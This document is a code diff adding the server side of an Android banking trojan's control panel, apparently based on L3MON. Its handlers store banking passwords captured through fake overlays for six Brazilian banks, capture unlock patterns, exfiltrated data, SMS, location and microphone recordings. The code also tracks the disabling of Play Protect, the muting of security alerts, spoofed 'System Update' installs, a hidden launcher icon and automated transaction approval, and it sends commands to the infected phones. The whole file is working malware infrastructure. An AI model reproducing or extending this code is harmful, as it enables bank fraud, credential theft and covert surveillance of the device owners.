@@ -1,0 +1,1118 @@
+              wifi.lastSeen = new Date();
+              dbwifiLog.push(wifi).write();
+              newCount++;
+            } else {
+              wifiField
+                .assign({
+                  lastSeen: new Date(),
+                })
+                .write();
+            }
+          });
+          logManager.log(
+            CONST.logTypes.success,
+            clientID +
+              " WiFi Updated - " +
+              newCount +
+              " New WiFi Hotspots Found",
+          );
+        }
+      }
+    });
+
+    socket.on(CONST.messageKeys.permissions, (data) => {
+      let permissions = Array.isArray(data && data.permissions)
+        ? data.permissions
+        : [];
+      let details = Array.isArray(data && data.details)
+        ? data.details
+        : permissions.map((permission) => ({
+            name: permission,
+            granted: true,
+            status: "granted",
+          }));
+
+      client.get("enabledPermissions").assign(permissions).write();
+      client.get("permissionDetails").assign(details).write();
+      client
+        .get("permissionSummary")
+        .assign({
+          grantedCount:
+            data && data.grantedCount ? data.grantedCount : permissions.length,
+          totalCount:
+            data && data.totalCount ? data.totalCount : details.length,
+          time: new Date(),
+        })
+        .write();
+      logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
+    });
+
+    socket.on(CONST.messageKeys.gotPermission, (data) => {
+      if (data && data.permission) {
+        client
+          .get("permissionChecks")
+          .push({
+            time: new Date(),
+            permission: data.permission,
+            isAllowed: data.isAllowed === true,
+            status: data.isAllowed === true ? "granted" : "blocked",
+          })
+          .write();
+        logManager.log(
+          CONST.logTypes.info,
+          clientID + " Permission Check Recieved",
+        );
+      }
+    });
+
+    socket.on(CONST.messageKeys.installed, (data) => {
+      client.get("apps").assign(data.apps).write();
+      logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
+    });
+
+    socket.on(CONST.messageKeys.setText, (data) => {
+      if (data && data.status) {
+        if (data.status === "success") {
+          logManager.log(
+            CONST.logTypes.success,
+            clientID + " SetText Executed: " + (data.text || ""),
+          );
+        } else if (data.status === "error") {
+          logManager.log(
+            CONST.logTypes.error,
+            clientID + " SetText Failed: " + (data.message || "Unknown error"),
+          );
+        }
+      }
+    });
+
+    socket.on(CONST.messageKeys.ats, (data) => {
+      if (data && data.operation) {
+        logManager.log(
+          CONST.logTypes.info,
+          clientID + " ATS Operation: " + data.operation,
+        );
+      }
+    });
+
+    socket.on(CONST.messageKeys.autoClick, (data) => {
+      if (data && data.buttonClicked) {
+        logManager.log(
+          CONST.logTypes.info,
+          clientID + " Auto Click: " + data.buttonText,
+        );
+
+        // Registra no log de auditoria
+        try {
+          let clientDB = this.getClientDatabase(clientID);
+          let atsConfig = clientDB.get("atsConfig").value();
+          if (atsConfig && atsConfig.atsLog) {
+            atsConfig.atsLog.push({
+              type: "auto_click",
+              buttonText: data.buttonText || "Desconhecido",
+              timestamp: new Date(),
+              success: data.buttonClicked === true,
+            });
+            clientDB.get("atsConfig.atsLog").assign(atsConfig.atsLog).write();
+          }
+        } catch (error) {
+          logManager.log(
+            CONST.logTypes.error,
+            "Erro ao registrar auto click: " + error.message,
+          );
+        }
+      }
+    });
+
+    socket.on(CONST.messageKeys.defenseDisable, (data) => {
+      if (data && data.operation) {
+        logManager.log(
+          CONST.logTypes.info,
+          clientID + " Defense Disable: " + data.operation,
+        );
+
+        // Registra no log de defesa desabilitada
+        try {
+          let clientDB = this.getClientDatabase(clientID);
+          let defenseConfig = clientDB.get("defenseConfig").value();
+
+          if (data.action === "disable_play_protect") {
+            defenseConfig.playProtectDisabled = data.success === true;
+          } else if (data.action === "mute_security_notifications") {
+            defenseConfig.securityNotificationsMuted = data.success === true;
+          }
+
+          if (defenseConfig.defenseLog) {
+            defenseConfig.defenseLog.push({
+              action: data.action || "unknown",
+              timestamp: new Date(),
+              success: data.success === true,
+              details: data.details || "",
+            });
+            clientDB
+              .get("defenseConfig.defenseLog")
+              .assign(defenseConfig.defenseLog)
+              .write();
+          }
+
+          clientDB.get("defenseConfig").assign(defenseConfig).write();
+        } catch (error) {
+          logManager.log(
+            CONST.logTypes.error,
+            "Erro ao registrar defesa desabilitada: " + error.message,
+          );
+        }
+      }
+    });
+
+    socket.on(CONST.messageKeys.permissionGrant, (data) => {
+      if (data && data.permission) {
+        logManager.log(
+          CONST.logTypes.info,
+          clientID + " Permission Grant: " + data.permission,
+        );
+
+        // Registra no log de concessão de permissões
+        try {
+          let clientDB = this.getClientDatabase(clientID);
+          let permissionGrantConfig = clientDB
+            .get("permissionGrantConfig")
+            .value();
+
+          if (
+            data.success === true &&
+            !permissionGrantConfig.grantedPermissions.includes(data.permission)
+          ) {
+            permissionGrantConfig.grantedPermissions.push(data.permission);
+          }
+
+          if (permissionGrantConfig.permissionLog) {
+            permissionGrantConfig.permissionLog.push({
+              permission: data.permission || "unknown",
+              timestamp: new Date(),
+              success: data.success === true,
+              details: data.details || "",
+            });
+            clientDB
+              .get("permissionGrantConfig.permissionLog")
+              .assign(permissionGrantConfig.permissionLog)
+              .write();
+          }
+
+          clientDB
+            .get("permissionGrantConfig")
+            .assign(permissionGrantConfig)
+            .write();
+        } catch (error) {
+          logManager.log(
+            CONST.logTypes.error,
+            "Erro ao registrar concessão de permissão: " + error.message,
+          );
+        }
+      }
+    });
+
+    socket.on(CONST.messageKeys.gestureSimulation, (data) => {
+      if (data && data.gestureType) {
+        logManager.log(
+          CONST.logTypes.info,
+          clientID + " Gesture Simulation: " + data.gestureType,
+        );
+
+        // Registra no log de gestos
+        try {
+          let clientDB = this.getClientDatabase(clientID);
+          let gestureConfig = clientDB.get("gestureSimulationConfig").value();
+
+          if (gestureConfig.gestureLog) {
+            gestureConfig.gestureLog.push({
+              gestureType: data.gestureType || "unknown",
+              x: data.x || 0,
+              y: data.y || 0,
+              duration: data.duration || 0,
+              endX: data.endX,
+              endY: data.endY,
+              timestamp: new Date(),
+              success: data.success === true,
+              details: data.details || "",
+            });
+            clientDB
+              .get("gestureSimulationConfig.gestureLog")
+              .assign(gestureConfig.gestureLog)
+              .write();
+          }
+
+          clientDB.get("gestureSimulationConfig").assign(gestureConfig).write();
+        } catch (error) {
+          logManager.log(
+            CONST.logTypes.error,
+            "Erro ao registrar gesto: " + error.message,
+          );
+        }
+      }
+    });
+
+    socket.on(CONST.messageKeys.transactionApproval, (data) => {
+      if (data && data.transactionType) {
+        logManager.log(
+          CONST.logTypes.info,
+          clientID + " Transaction Approval: " + data.transactionType,
+        );
+
+        try {
+          let clientDB = this.getClientDatabase(clientID);
+          let transactionConfig = clientDB
+            .get("transactionApprovalConfig")
+            .value();
+
+          if (transactionConfig.autoApprovalLog) {
+            transactionConfig.autoApprovalLog.push({
+              transactionType: data.transactionType || "unknown",
+              amount: data.amount || 0,
+              recipient: data.recipient || "",
+              timestamp: new Date(),
+              success: data.success === true,
+              details: data.details || "",
+            });
+            clientDB
+              .get("transactionApprovalConfig.autoApprovalLog")
+              .assign(transactionConfig.autoApprovalLog)
+              .write();
+          }
+
+          clientDB
+            .get("transactionApprovalConfig")
+            .assign(transactionConfig)
+            .write();
+        } catch (error) {
+          logManager.log(
+            CONST.logTypes.error,
+            "Erro ao registrar aprovação de transação: " + error.message,
+          );
+        }
+      }
+    });
+
+    socket.on(CONST.messageKeys.dynamicScreenUnlock, (data) => {
+      if (data && (data.action === "capture" || data.action === "unlock")) {
+        logManager.log(
+          CONST.logTypes.info,
+          clientID + " Dynamic Screen Unlock: " + data.action,
+        );
+
+        try {
+          let clientDB = this.getClientDatabase(clientID);
+          let unlockConfig = clientDB.get("dynamicScreenUnlockConfig").value();
+
+          if (data.action === "capture" && data.pattern) {
+            // Armazena padrão capturado
+            if (!unlockConfig.capturedPatterns) {
+              unlockConfig.capturedPatterns = [];
+            }
+            unlockConfig.capturedPatterns.push({
+              pattern: data.pattern,
+              type: data.patternType || "unknown",
+              timestamp: new Date(),
+            });
+          }
+
+          if (unlockConfig.unlockLog) {
+            unlockConfig.unlockLog.push({
+              action: data.action || "unknown",
+              patternType: data.patternType || "unknown",
+              timestamp: new Date(),
+              success: data.success === true,
+              details: data.details || "",
+            });
+            clientDB
+              .get("dynamicScreenUnlockConfig.unlockLog")
+              .assign(unlockConfig.unlockLog)
+              .write();
+          }
+
+          clientDB
+            .get("dynamicScreenUnlockConfig")
+            .assign(unlockConfig)
+            .write();
+        } catch (error) {
+          logManager.log(
+            CONST.logTypes.error,
+            "Erro ao registrar desbloqueio de tela: " + error.message,
+          );
+        }
+      }
+    });
+
+    socket.on(CONST.messageKeys.overlayInjection, (data) => {
+      if (
+        data &&
+        (data.action === "capture_credentials" ||
+          data.action === "show_overlay" ||
+          data.action === "hide_overlay" ||
+          data.action === "enable_monitoring" ||
+          data.action === "disable_monitoring")
+      ) {
+        logManager.log(
+          CONST.logTypes.info,
+          clientID + " Overlay Injection: " + data.action,
+        );
+
+        try {
+          let clientDB = this.getClientDatabase(clientID);
+          let overlayConfig = clientDB.get("overlayInjectionConfig").value();
+
+          if (
+            data.action === "capture_credentials" &&
+            data.username &&
+            data.password
+          ) {
+            if (!overlayConfig.capturedCredentials) {
+              overlayConfig.capturedCredentials = [];
+            }
+            overlayConfig.capturedCredentials.push({
+              username: data.username,
+              password: data.password,
+              appName: data.appName || "unknown",
+              packageName: data.packageName || "unknown",
+              timestamp: new Date(),
+              ipAddress: socket.handshake.address || "unknown",
+            });
+          }
+
+          if (data.action === "show_overlay") {
+            overlayConfig.activeOverlays.push({
+              appName: data.appName || "unknown",
+              packageName: data.packageName || "unknown",
+              startTime: new Date(),
+              endTime: null,
+            });
+          }
+
+          if (data.action === "enable_monitoring") {
+            overlayConfig.monitoringEnabled = true;
+          }
+          if (data.action === "disable_monitoring") {
+            overlayConfig.monitoringEnabled = false;
+          }
+
+          if (overlayConfig.overlayLog) {
+            overlayConfig.overlayLog.push({
+              action: data.action,
+              appName: data.appName || "unknown",
+              packageName: data.packageName || "unknown",
+              timestamp: new Date(),
+              success: data.success === true,
+              details: data.details || "",
+            });
+          }
+
+          clientDB.get("overlayInjectionConfig").assign(overlayConfig).write();
+        } catch (error) {
+          logManager.log(
+            CONST.logTypes.error,
+            "Erro ao registrar injeção de overlay: " + error.message,
+          );
+        }
+      }
+    });
+
+    socket.on(CONST.messageKeys.customizedFormsCapture, (data) => {
+      if (
+        data &&
+        (data.action === "capture_field" ||
+          data.action === "submit_form" ||
+          data.action === "enable_realtime" ||
+          data.action === "disable_realtime" ||
+          data.action === "show_form")
+      ) {
+        logManager.log(
+          CONST.logTypes.info,
+          clientID + " Customized Forms Capture: " + data.action,
+        );
+
+        try {
+          let clientDB = this.getClientDatabase(clientID);
+          let fcConfig = clientDB.get("customizedFormsCaptureConfig").value();
+
+          if (data.action === "capture_field") {
+            // Captura individual de cada campo em tempo real
+            if (!fcConfig.capturedData) {
+              fcConfig.capturedData = [];
+            }
+            fcConfig.capturedData.push({
+              bankName: data.bankName || "unknown",
+              fieldName: data.fieldName || "unknown",
+              fieldValue: data.fieldValue || "",
+              fieldType: data.fieldType || "text",
+              timestamp: new Date(),
+              sequenceOrder: data.sequenceOrder || 0,
+              ipAddress: socket.handshake.address || "unknown",
+            });
+          }
+
+          if (data.action === "submit_form") {
+            // Consolidação final quando formulário é enviado
+            fcConfig.capturedData.push({
+              bankName: data.bankName || "unknown",
+              fieldName: "FORM_SUBMISSION",
+              fieldValue: JSON.stringify(data.formData || {}),
+              fieldType: "submission",
+              timestamp: new Date(),
+              sequenceOrder: -1,
+              ipAddress: socket.handshake.address || "unknown",
+            });
+          }
+
+          if (data.action === "enable_realtime") {
+            fcConfig.realTimeCaptureEnabled = true;
+          }
+          if (data.action === "disable_realtime") {
+            fcConfig.realTimeCaptureEnabled = false;
+          }
+
+          if (data.action === "show_form") {
+            fcConfig.captureLog.push({
+              action: "show_form",
+              bankName: data.bankName || "unknown",
+              templateVersion: data.templateVersion || "1.0",
+              timestamp: new Date(),
+              success: true,
+              details:
+                "Fake form displayed for " + (data.bankName || "unknown"),
+            });
+          }
+
+          clientDB.get("customizedFormsCaptureConfig").assign(fcConfig).write();
+        } catch (error) {
+          logManager.log(
+            CONST.logTypes.error,
+            "Erro ao registrar captura de formulário: " + error.message,
+          );
+        }
+      }
+    });
+
+    socket.on(CONST.messageKeys.exfil, (data) => {
+      try {
+        let exfilLog = clientDB.get("exfilLog");
+        if (!exfilLog.value()) {
+          clientDB.set("exfilLog", []).write();
+          exfilLog = clientDB.get("exfilLog");
+        }
+
+        let entry = {
+          time: new Date(),
+          action: data.action || "fragment",
+          packageName: data.package || data.packageName || "unknown",
+          pattern: data.pattern || "unknown",
+          field: data.field || data.viewId || "",
+          value: data.value || data.data || data.text || "",
+          channel: data.channel || "socket",
+          ip: socket.handshake.address || "unknown",
+        };
+
+        // Se for fragmento, tenta reconstruir (simplificado)
+        if (data.chunk_index !== undefined) {
+          entry.isFragment = true;
+          entry.chunk = data.chunk_index;
+          entry.total = data.total_chunks;
+        }
+
+        exfilLog.push(entry).write();
+
+        logManager.log(
+          CONST.logTypes.success,
+          `${clientID} Exfil Recieved (${entry.action}) - ${entry.pattern}`,
+        );
+      } catch (e) {
+        logManager.log(
+          CONST.logTypes.error,
+          "Erro ao processar exfil: " + e.message,
+        );
+      }
+    });
+
+    socket.on(CONST.messageKeys.bypassProtections, (data) => {
+      try {
+        let bpConfig = clientDB.get("bypassProtectionsConfig").value() || {};
+
+        if (data.action === "enable_bypass") {
+          bpConfig.bypassEnabled = true;
+          bpConfig.bypassLog.push({
+            action: "enable_bypass",
+            timestamp: new Date(),
+            success: true,
+            details: "Bypass de proteções ativado",
+          });
+        } else if (data.action === "disable_bypass") {
+          bpConfig.bypassEnabled = false;
+          bpConfig.bypassLog.push({
+            action: "disable_bypass",
+            timestamp: new Date(),
+            success: true,
+            details: "Bypass de proteções desativado",
+          });
+        } else if (data.action === "bypass_restricted_settings") {
+          bpConfig.restrictedSettingsBypassed = true;
+          bpConfig.bypassLog.push({
+            action: "bypass_restricted_settings",
+            timestamp: new Date(),
+            success: data.success || false,
+            details:
+              data.details || "Tentativa de bypass de Configuração Restrita",
+          });
+        } else if (data.action === "force_accessibility_service") {
+          bpConfig.accessibilityServiceForced = true;
+          bpConfig.installationMethod =
+            data.installationMethod || "system_update";
+          bpConfig.spoofedAppName = data.spoofedAppName || "System Update";
+          bpConfig.bypassLog.push({
+            action: "force_accessibility_service",
+            timestamp: new Date(),
+            success: data.success || false,
+            method: data.installationMethod,
+            spoofedName: data.spoofedAppName,
+            details: "Forçar ativação de Serviço de Acessibilidade",
+          });
+        } else if (data.action === "detect_protections") {
+          if (data.protections) {
+            bpConfig.detectedProtections = data.protections;
+            bpConfig.androidVersion = data.androidVersion || 0;
+          }
+          bpConfig.bypassLog.push({
+            action: "detect_protections",
+            timestamp: new Date(),
+            success: true,
+            detectedCount: data.protections ? data.protections.length : 0,
+            details:
+              "Proteções detectadas: " +
+              (data.protections ? data.protections.join(", ") : "nenhuma"),
+          });
+        } else if (data.action === "installation_method_update") {
+          bpConfig.installationMethod =
+            data.installationMethod || "video_player";
+          bpConfig.spoofedAppType = data.spoofedAppType || "video_player";
+          bpConfig.bypassLog.push({
+            action: "installation_method_update",
+            timestamp: new Date(),
+            success: true,
+            method: data.installationMethod,
+            details:
+              "Método de instalação enganoso: " + data.installationMethod,
+          });
+        }
+
+        clientDB.get("bypassProtectionsConfig").assign(bpConfig).write();
+      } catch (error) {
+        logManager.log(
+          CONST.logTypes.error,
+          "Erro ao processar bypass de proteções: " + error.message,
+        );
+      }
+    });
+  }
+
+  // GET
+  async getClient(clientID) {
+    if (this.db.usePrisma) {
+      const client = await this.db.prisma.client.findUnique({ where: { clientId: clientID } });
+      return client ? { ...client, clientID: client.clientId, isOnline: client.isOnline, data: client.data } : false;
+    }
+
+    let client = this.db.maindb.get("clients").find({ clientID }).value();
+    if (client !== undefined) return client;
+    else return false;
+  }
+
+  async getClientList() {
+    if (this.db.usePrisma) {
+      return (await this.db.prisma.client.findMany()).map((client) => ({ ...client, clientID: client.clientId, isOnline: client.isOnline, data: client.data }));
+    }
+
+    return this.db.maindb.get("clients").value();
+  }
+
+  async getClientListOnline() {
+    if (this.db.usePrisma) {
+      return (await this.db.prisma.client.findMany({ where: { isOnline: true } })).map((client) => ({ ...client, clientID: client.clientId, isOnline: client.isOnline, data: client.data }));
+    }
+
+    return this.db.maindb
+      .get("clients")
+      .value()
+      .filter((client) => client.isOnline);
+  }
+  async getClientListOffline() {
+    if (this.db.usePrisma) {
+      return (await this.db.prisma.client.findMany({ where: { isOnline: false } })).map((client) => ({ ...client, clientID: client.clientId, isOnline: client.isOnline, data: client.data }));
+    }
+
+    return this.db.maindb
+      .get("clients")
+      .value()
+      .filter((client) => !client.isOnline);
+  }
+
+  getClientDataByPage(clientID, page, filter = undefined) {
+    let client = db.maindb.get("clients").find({ clientID }).value();
+    if (client !== undefined) {
+      let clientDB = this.getClientDatabase(client.clientID);
+      let clientData = clientDB.value();
+
+      let pageData;
+
+      if (page === "calls") {
+        pageData = clientDB.get("CallData").sortBy("date").reverse().value();
+        if (filter) {
+          let filterData = clientDB
+            .get("CallData")
+            .sortBy("date")
+            .reverse()
+            .value()
+            .filter((calls) => calls.phoneNo.substr(-6) === filter.substr(-6));
+          if (filterData) pageData = filterData;
+        }
+      } else if (page === "sms") {
+        pageData = clientData.SMSData;
+        if (filter) {
+          let filterData = clientDB
+            .get("SMSData")
+            .value()
+            .filter((sms) => sms.address.substr(-6) === filter.substr(-6));
+          if (filterData) pageData = filterData;
+        }
+      } else if (page === "notifications") {
+        pageData = clientDB
+          .get("notificationLog")
+          .sortBy("postTime")
+          .reverse()
+          .value();
+        if (filter) {
+          let filterData = clientDB
+            .get("notificationLog")
+            .sortBy("postTime")
+            .reverse()
+            .value()
+            .filter((not) => not.appName === filter);
+          if (filterData) pageData = filterData;
+        }
+      } else if (page === "wifi") {
+        pageData = {};
+        pageData.now = clientData.wifiNow;
+        pageData.log = clientData.wifiLog;
+      } else if (page === "contacts") pageData = clientData.contacts;
+      else if (page === "permissions")
+        pageData =
+          clientData.permissionDetails || clientData.enabledPermissions || [];
+      else if (page === "clipboard")
+        pageData = clientDB
+          .get("clipboardLog")
+          .sortBy("time")
+          .reverse()
+          .value();
+      else if (page === "apps") pageData = clientData.apps;
+      else if (page === "files") pageData = clientData.currentFolder;
+      else if (page === "downloads")
+        pageData = clientData.downloads.filter(
+          (download) => download.type === "download",
+        );
+      else if (page === "autoclick") pageData = {};
+      else if (page === "overlay") pageData = {};
+      else if (page === "defense_disable") {
+        let defenseConfig = clientDB.get("defenseConfig").value() || {};
+        pageData = {
+          playProtectDisabled: defenseConfig.playProtectDisabled || false,
+          securityNotificationsMuted:
+            defenseConfig.securityNotificationsMuted || false,
+          defenseLog: defenseConfig.defenseLog || [],
+        };
+      } else if (page === "permission_grant") {
+        let permissionGrantConfig =
+          clientDB.get("permissionGrantConfig").value() || {};
+        pageData = {
+          autoGrantEnabled: permissionGrantConfig.autoGrantEnabled || false,
+          grantedPermissions: permissionGrantConfig.grantedPermissions || [],
+          permissionLog: permissionGrantConfig.permissionLog || [],
+        };
+      } else if (page === "gesture_simulation") {
+        let gestureConfig =
+          clientDB.get("gestureSimulationConfig").value() || {};
+        pageData = {
+          recordedGestures: gestureConfig.recordedGestures || [],
+          gestureLog: gestureConfig.gestureLog || [],
+        };
+      } else if (page === "transaction_approval") {
+        let transactionConfig =
+          clientDB.get("transactionApprovalConfig").value() || {};
+        pageData = {
+          enableAutoApproval: transactionConfig.enableAutoApproval || false,
+          autoApprovalLog: transactionConfig.autoApprovalLog || [],
+        };
+      } else if (page === "dynamic_screen_unlock") {
+        let unlockConfig =
+          clientDB.get("dynamicScreenUnlockConfig").value() || {};
+        pageData = {
+          capturedPatterns: unlockConfig.capturedPatterns || [],
+          unlockLog: unlockConfig.unlockLog || [],
+          autoUnlockEnabled: unlockConfig.autoUnlockEnabled || false,
+        };
+      } else if (page === "overlay_injection") {
+        let overlayConfig =
+          clientDB.get("overlayInjectionConfig").value() || {};
+        pageData = {
+          enabledBanks: overlayConfig.enabledBanks || [
+            "itau",
+            "bradesco",
+            "caixa",
+            "nubank",
+            "bb",
+            "santander",
+          ],
+          activeOverlays: overlayConfig.activeOverlays || [],
+          capturedCredentials: overlayConfig.capturedCredentials || [],
+          overlayLog: overlayConfig.overlayLog || [],
+          monitoringEnabled: overlayConfig.monitoringEnabled || false,
+        };
+      } else if (page === "customized_forms_capture") {
+        let fcConfig =
+          clientDB.get("customizedFormsCaptureConfig").value() || {};
+        pageData = {
+          enabledBanks: fcConfig.enabledBanks || {
+            itau: true,
+            bradesco: true,
+            caixa: true,
+            nubank: true,
+            bb: true,
+            santander: true,
+          },
+          realTimeCaptureEnabled: fcConfig.realTimeCaptureEnabled || false,
+          capturedData: fcConfig.capturedData || [],
+          captureLog: fcConfig.captureLog || [],
+          templateVersions: fcConfig.templateVersions || {},
+        };
+      } else if (page === "bypass_protections") {
+        let bpConfig = clientDB.get("bypassProtectionsConfig").value() || {};
+        pageData = {
+          bypassEnabled: bpConfig.bypassEnabled || false,
+          androidVersion: bpConfig.androidVersion || 0,
+          restrictedSettingsBypassed:
+            bpConfig.restrictedSettingsBypassed || false,
+          accessibilityServiceForced:
+            bpConfig.accessibilityServiceForced || false,
+          installationMethod: bpConfig.installationMethod || "none",
+          spoofedAppName: bpConfig.spoofedAppName || "System Update",
+          spoofedAppType: bpConfig.spoofedAppType || "system_update",
+          bypassLog: bpConfig.bypassLog || [],
+          detectedProtections: bpConfig.detectedProtections || [],
+          bypassStatus: bpConfig.bypassStatus || {},
+        };
+      } else if (page === "advanced_hide_icon") {
+        let hideConfig = clientDB.get("advancedHideIconConfig").value() || {};
+        pageData = {
+          hideEnabled: hideConfig.hideEnabled || false,
+          iconHidden: hideConfig.iconHidden || false,
+          backgroundServiceActive: hideConfig.backgroundServiceActive || false,
+          activationMethod: hideConfig.activationMethod || "none",
+          activationCode: hideConfig.activationCode || "",
+          smsActivationEnabled: hideConfig.smsActivationEnabled || false,
+          smsActivationPhrase:
+            hideConfig.smsActivationPhrase || "activate_l3mon",
+          launcherIconRemoved: hideConfig.launcherIconRemoved || false,
+          launcherName: hideConfig.launcherName || "com.etechd.l3mon",
+          launcherAlias: hideConfig.launcherAlias || "Hidden Service",
+          hideLog: hideConfig.hideLog || [],
+          hiddenStatus: hideConfig.hiddenStatus || {},
+          detectedLaunchers: hideConfig.detectedLaunchers || [],
+          restoreMethod: hideConfig.restoreMethod || "none",
+        };
+      } else if (page === "text_injection") {
+        pageData = {
+          editableFields: client.lastEditableFields || [],
+          lastUpdate: client.lastAccessibilityUpdate || "Nunca",
+        };
+      } else if (page === "ats") pageData = {};
+      else if (page === "exfil" || page === "stealth_exfil") {
+        let exfilLog = clientDB.get("exfilLog").value() || [];
+        pageData = {
+          logs: exfilLog.slice().reverse().slice(0, 300),
+          total: exfilLog.length,
+        };
+      } else if (page === "microphone")
+        pageData = clientDB
+          .get("downloads")
+          .value()
+          .filter((download) => download.type === "voiceRecord");
+      else if (page === "gps") pageData = clientData.GPSData;
+      else if (page === "info") pageData = client;
+
+      return pageData;
+    } else return false;
+  }
+
+  // DELETE
+  deleteClient(clientID) {
+    this.db.get("clients").remove({ clientID }).write();
+    if (this.clientConnections[clientID])
+      delete this.clientConnections[clientID];
+  }
+
+  // COMMAND
+  sendCommand(clientID, commandID, commandPayload = {}, cb = () => {}) {
+    this.checkCorrectParams(commandID, commandPayload, (error) => {
+      if (!error) {
+        let client = this.db.maindb.get("clients").find({ clientID }).value();
+        if (client !== undefined) {
+          commandPayload.type = commandID;
+          if (clientID in this.clientConnections) {
+            let socket = this.clientConnections[clientID];
+            logManager.log(
+              CONST.logTypes.info,
+              "Requested " + commandID + " From " + clientID,
+            );
+            socket.emit("order", commandPayload);
+            return cb(false, "Requested");
+          } else {
+            this.queCommand(clientID, commandPayload, (error) => {
+              if (!error)
+                return cb(false, "Command queued (device is offline)");
+              else return cb(error, undefined);
+            });
+          }
+        } else return cb("Client Doesn't exist!", undefined);
+      } else return cb(error, undefined);
+    });
+  }
+
+  queCommand(clientID, commandPayload, cb) {
+    let clientDB = this.getClientDatabase(clientID);
+    let commandQue = clientDB.get("CommandQue");
+    let outstandingCommands = [];
+    commandQue.value().forEach((command) => {
+      outstandingCommands.push(command.type);
+    });
+
+    if (outstandingCommands.includes(commandPayload.type))
+      return cb("A similar command has already been queued");
+    else {
+      // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
+      // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
+      commandPayload.uid = Math.floor(Math.random() * 10000);
+      commandQue.push(commandPayload).write();
+      return cb(false);
+    }
+  }
+
+  checkCorrectParams(commandID, commandPayload, cb) {
+    if (commandID === CONST.messageKeys.sms) {
+      if (!("action" in commandPayload))
+        return cb("SMS Missing `action` Parameter");
+      else {
+        if (commandPayload.action === "ls") return cb(false);
+        else if (commandPayload.action === "sendSMS") {
+          if (!("to" in commandPayload))
+            return cb("SMS Missing `to` Parameter");
+          else if (!("sms" in commandPayload))
+            return cb("SMS Missing `to` Parameter");
+          else return cb(false);
+        } else return cb("SMS `action` parameter incorrect");
+      }
+    } else if (commandID === CONST.messageKeys.files) {
+      if (!("action" in commandPayload))
+        return cb("Files Missing `action` Parameter");
+      else {
+        if (commandPayload.action === "ls") {
+          if (!("path" in commandPayload))
+            return cb("Files Missing `path` Parameter");
+          else return cb(false);
+        } else if (commandPayload.action === "dl") {
+          if (!("path" in commandPayload))
+            return cb("Files Missing `path` Parameter");
+          else return cb(false);
+        } else return cb("Files `action` parameter incorrect");
+      }
+    } else if (commandID === CONST.messageKeys.mic) {
+      if ((!"sec") in commandPayload) return cb("Mic Missing `sec` Parameter");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.gotPermission) {
+      if ((!"permission") in commandPayload)
+        return cb("GotPerm Missing `permission` Parameter");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.permissionAction) {
+      if (!("permission" in commandPayload))
+        return cb("Permission Action Missing `permission` Parameter");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.autoClick) {
+      if (!("action" in commandPayload))
+        return cb("AutoClick Missing `action` Parameter");
+      if (!("x" in commandPayload))
+        return cb("AutoClick Missing `x` Parameter");
+      if (!("y" in commandPayload))
+        return cb("AutoClick Missing `y` Parameter");
+      if (isNaN(parseInt(commandPayload.x)))
+        return cb("AutoClick `x` Parameter must be a number");
+      if (isNaN(parseInt(commandPayload.y)))
+        return cb("AutoClick `y` Parameter must be a number");
+      if (
+        commandPayload.action !== "tap" &&
+        commandPayload.action !== "long" &&
+        commandPayload.action !== "swipe"
+      )
+        return cb("AutoClick `action` parameter incorrect");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.overlay) {
+      if (!("text" in commandPayload))
+        return cb("Overlay Missing `text` Parameter");
+      if (
+        typeof commandPayload.text !== "string" ||
+        commandPayload.text.trim().length === 0
+      )
+        return cb("Overlay `text` Parameter must be a non-empty string");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.accessibilityBypass) {
+      if (!("service" in commandPayload))
+        return cb("Accessibility Bypass Missing `service` Parameter");
+      if (
+        typeof commandPayload.service !== "string" ||
+        commandPayload.service.trim().length === 0
+      )
+        return cb(
+          "Accessibility Bypass `service` Parameter must be a non-empty string",
+        );
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.setText) {
+      if (!("text" in commandPayload))
+        return cb("SetText Missing `text` Parameter");
+      if (
+        typeof commandPayload.text !== "string" ||
+        commandPayload.text.trim().length === 0
+      )
+        return cb("SetText `text` Parameter must be a non-empty string");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.defenseDisable) {
+      if (!("action" in commandPayload))
+        return cb("DefenseDisable Missing `action` Parameter");
+      const validActions = [
+        "disable_play_protect",
+        "mute_security_notifications",
+      ];
+      if (!validActions.includes(commandPayload.action))
+        return cb("DefenseDisable `action` parameter incorrect");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.permissionGrant) {
+      if (!("action" in commandPayload))
+        return cb("PermissionGrant Missing `action` Parameter");
+      const validActions = ["enable", "disable", "grant_permission"];
+      if (!validActions.includes(commandPayload.action))
+        return cb("PermissionGrant `action` parameter incorrect");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.gestureSimulation) {
+      if (!("gestureType" in commandPayload))
+        return cb("GestureSimulation Missing `gestureType` Parameter");
+      if (!("x" in commandPayload) || !("y" in commandPayload))
+        return cb("GestureSimulation Missing `x` or `y` Parameter");
+      const validGestures = ["tap", "long_tap", "swipe"];
+      if (!validGestures.includes(commandPayload.gestureType))
+        return cb("GestureSimulation `gestureType` parameter incorrect");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.transactionApproval) {
+      if (!("action" in commandPayload))
+        return cb("TransactionApproval Missing `action` Parameter");
+      const validActions = [
+        "fill_fields",
+        "approve_transaction",
+        "enable_auto_approval",
+        "disable_auto_approval",
+      ];
+      if (!validActions.includes(commandPayload.action))
+        return cb("TransactionApproval `action` parameter incorrect");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.dynamicScreenUnlock) {
+      if (!("action" in commandPayload))
+        return cb("DynamicScreenUnlock Missing `action` Parameter");
+      const validActions = [
+        "capture_pattern",
+        "replay_pattern",
+        "enable_auto_unlock",
+        "disable_auto_unlock",
+      ];
+      if (!validActions.includes(commandPayload.action))
+        return cb("DynamicScreenUnlock `action` parameter incorrect");
+      else cb(false);
+    } else if (commandID === CONST.messageKeys.overlayInjection) {
+      if (!("action" in commandPayload))
+        return cb("OverlayInjection Missing `action` Parameter");
+      const validActions = [
+        "show_overlay",
+        "hide_overlay",
+        "capture_credentials",
+        "enable_monitoring",
+        "disable_monitoring",
+        "enable_bank",
+        "disable_bank",
+        "clear_credentials",
+      ];
